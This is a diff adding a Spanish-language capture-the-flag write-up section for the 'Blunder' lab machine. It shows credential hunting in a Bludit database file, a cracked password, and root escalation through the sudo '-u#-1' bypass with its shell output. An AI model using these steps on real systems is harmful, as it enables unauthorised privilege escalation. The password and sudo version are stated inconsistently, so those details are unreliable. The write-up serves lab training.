@@ -349,3 +349,54 @@ Configuramos las rows y columns, chequeando con `stty -a`en nuestra terminal
 `$ stty rows 51 columns 181`
 
 # Escalada de Privilegios y busqueda de la flag User.txt
+
+Enumeramos el sistema:
+Encontramos dos usuarios `hugo` y `shaun`
+`$ find \ -name user.txt 2>/dev/null` y nos devuelve que el archivo se encuentra en el directorio de HUGO al cual no tenemos acceso
+Ya sabemos que tenemos que convertirnos en el usuario HUGO
+`$ grep -r -i "hugo" 2>/dev/null` y en los dos primeros matches, encontramos dos archivos que hacen referencia a database, nos movemos a la ruta
+listamos los ficheros curiosos y efectivamente:
+``` bash
+ $"www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php" 
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+
+"Password": "Password120"			contraseña crackeada con Crackstation
+```
+Ya podemos hacer un `su hugo` introducimos la password `Password210`
+
+# Conseguir el Privesc para el usuario Root
+
+Encontramos que haciendo el siguiente comando para listar la version de sudo
+
+Listando las versions de SUDO con el commando `apt list | grep “sudo”`
+vemos la version de SUDO instalada 1.8.5
+
+Buscamos por `Searchsploit` y resulta que hay para esa version una vulnerabilidad que salio hace poco llamada Security Bypass
+```bash
+"sudo 1.8.27 - Security Bypass                                                          linux/local/47502.py	"                                                                                    
+```
+Haciendo:  `$ sudo -u#-1 /bin/bash`  
+```bash
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# 
+```
+Lo conseguimos ya somos `root` y ya podriamos listar la flag `root.txt` en la ruta `/root/root.txt`
